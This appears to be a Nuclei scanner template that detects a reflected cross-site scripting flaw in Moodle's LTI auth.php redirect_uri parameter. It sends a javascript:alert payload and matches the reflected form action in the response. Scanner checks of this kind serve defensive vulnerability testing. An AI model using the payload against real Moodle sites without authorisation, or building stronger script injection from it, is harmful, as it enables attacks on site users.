id: moodle-xss

info:
  name: Moodle redirect_uri Reflected XSS
  author: hackergautam
  description: XSS in moodle via redirect_uri parameter
  severity: medium
  tags: moodle,xss
  reference: https://twitter.com/kx1z0/status/1381588818256617479

requests:
  - method: GET
    path:
      - "{{BaseURL}}/mod/lti/auth.php?redirect_uri=javascript:alert('{{randstr}}')"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{{randstr}}'
          - '<form action="javascript:alert'
        condition: and

      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "text/html"